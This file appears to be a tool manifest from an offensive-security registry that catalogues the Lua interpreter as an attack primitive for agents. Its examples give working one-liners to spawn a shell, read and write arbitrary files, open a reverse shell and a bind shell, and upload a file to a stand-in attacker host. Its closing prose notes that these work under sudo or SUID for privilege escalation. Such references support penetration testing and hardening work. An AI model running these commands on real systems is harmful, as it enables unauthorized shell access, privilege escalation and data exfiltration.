---
id: runtime-lua
namespace: runtime:scripting:lua
name: lua
description: Lua programming language interpreter with extensive capabilities for shell, file, and network operations.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - security.privilege-escalation.shell
  - security.execution.reverse-shell
  - security.execution.bind-shell
  - security.execution.command
  - system.file.read
  - system.file.write
  - network.transfer.download
  - network.transfer.upload
platforms:
  - linux
  - macos
  - cross-platform
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies:
  - lua-socket
related_tools:
  - python
  - perl
  - ruby
artifacts: []
workflow_edges:
  produces:
    - shell-access
    - reverse-shell
    - bind-shell
    - file-content
  consumes:
    - script-string
contract:
  inputs:
    - type: system.command.string
      description: Lua -e code string
  outputs:
    - type: process.output
      description: Command or shell output
  side_effects:
    - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 8
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 8
  network: medium
  disk_io: low
allowed-tools:
  - lua
  - Bash
  - execFile
parameters:
  - name: e
    type: string
    required: false
    description: "Execute Lua code"
    aliases:
      - -e
features:
  - process-manip
  - network-intensive
execution:
  template: "lua {e}"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars:
  target: ip
  port: port
examples:
  - description: Spawn an interactive shell
    command: lua -e 'os.execute("/bin/sh")'
  - description: Read arbitrary file
    command: lua -e 'local f=io.open("/path/to/input-file", "rb"); io.write(f:read("*a")); io.close(f);'
  - description: Write arbitrary data to file
    command: lua -e 'local f=io.open("/path/to/output-file", "wb"); f:write("DATA"); io.close(f);'
  - description: Spawn reverse shell (requires lua-socket)
    command: |-
      lua -e '
        local s=require("socket");
        local t=assert(s.tcp());
        t:connect("attacker.com",12345);
        while true do
          local r,x=t:receive();local f=assert(io.popen(r,"r"));
          local b=assert(f:read("*a"));t:send(b);
        end;
        f:close();t:close();'
  - description: Spawn bind shell (requires lua-socket)
    command: |-
      lua -e '
        local k=require("socket");
        local s=assert(k.bind("*",12345));
        local c=s:accept();
        while true do
          local r,x=c:receive();local f=assert(io.popen(r,"r"));
          local b=assert(f:read("*a"));c:send(b);
        end;c:close();f:close();'
  - description: Upload file (requires lua-socket)
    command: |-
      lua -e '
        local f=io.open("/path/to/input-file", "rb")
        local d=f:read("*a")
        io.close(f);
        local s=require("socket");
        local t=assert(s.tcp());
        t:connect("attacker.com",12345);
        t:send(d);
        t:close();'
  - description: Download file (requires lua-socket)
    command: |-
      lua -e '
        local k=require("socket");
        local s=assert(k.bind("*",12345));
        local c=s:accept();
        local d,x=c:receive("*a");
        c:close();
        local f=io.open("/path/to/output-file", "wb");
        f:write(d);
        io.close(f);'
references:
  - label: "Lua documentation"
    url: "https://www.lua.org/docs.html"
techniques:
  - privilege-escalation
  - execution
  - exfiltration
  - collection
install:
    - method: apt
      package_name: "lua5.4"
      commands:
        - "apt-get install -y lua5.4"
---


# lua — Lua Interpreter

Lua is a powerful, lightweight programming language. With sudo or SUID, `lua -e` can execute arbitrary Lua code for shell access, file read/write, reverse shells, bind shells, and file transfers (some features require `lua-socket`).
